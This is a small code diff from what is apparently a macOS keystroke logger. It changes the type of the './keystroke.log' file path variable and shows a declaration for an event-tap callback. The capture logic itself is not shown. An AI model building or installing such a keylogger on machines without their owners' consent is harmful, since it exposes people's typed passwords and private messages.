@@ -7,7 +7,7 @@
 
 using namespace std;
 
-string logfileLocation = "./keystroke.log";
+const char *logfileLocation = "./keystroke.log";
 CGEventRef CGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
 
 int main(int argc, const char *argv[]) {
